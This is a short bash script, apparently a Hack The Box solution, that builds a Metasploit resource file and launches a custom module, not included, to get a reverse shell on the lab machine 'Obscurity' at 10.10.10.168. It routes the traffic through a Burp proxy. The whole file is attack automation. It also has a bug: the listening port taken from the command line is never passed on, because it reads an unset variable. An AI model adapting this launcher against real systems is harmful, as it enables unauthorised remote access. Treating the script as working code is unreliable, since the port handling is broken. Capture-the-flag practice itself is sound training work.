#!/bin/bash
#
# Author: Matej Fabijanic <root4unix@gmail.com>
# Hack The Box
# Machine: Obscurity
# Exploit SuperSecureServer.py
#

#----------------------------- Config
msf_workspace="htb"     # Metasploit Workspace
net_iface="tun0"        # Network Interface

# HTTP Proxy - Burp
http_proxy_host="127.0.0.1"
http_proxy_port="8080"

exploit="exploit/htb/htb_obscurity_sss"
msf_rc="/var/tmp/msf_htb_obscurity_sss.$$.rc"

ip="/usr/sbin/ip"
awk="/usr/bin/awk"


#----------------------------- Functions
usage() {
    echo "$(basename "$0") <LPORT>"
    echo "  LPORT - local port (listening for reverse shell)"
    echo
}

get_ip() {
    local iface=$1
    # shellcheck disable=SC2016
    ip_addr="$($ip -4 -o a s dev "$iface" | $awk '{print $4}' | $awk -F "/" '{print $1}')"
    echo "$ip_addr"
}


#----------------------------- Main
if [ -z "$1" ]; then
    usage
    exit 1
fi

if ! $ip -4 -o a s dev "$net_iface" &>/dev/null; then
    echo "Check network interface $net_iface"
    exit 1
fi

ip_addr="$(get_ip $net_iface)"
[ -n "$msf_workspace" ] && set_rc_workspace="workspace $msf_workspace"
if [ -n "$http_proxy_host" ] && [ -n "$http_proxy_port" ]; then
    set_rc_proxy="set Proxies http:$http_proxy_host:$http_proxy_port
set ReverseAllowProxy true"
fi
[ -n "$lport" ] && set_rc_lport="set LPORT $lport"

echo "$set_rc_workspace
use $exploit
set RHOSTS 10.10.10.168
set LHOST $ip_addr
$set_rc_lport
$set_rc_proxy
show options
exploit
" >> $msf_rc

# Run exploit
msfconsole -m . -r $msf_rc
# delete temp file
rm $msf_rc

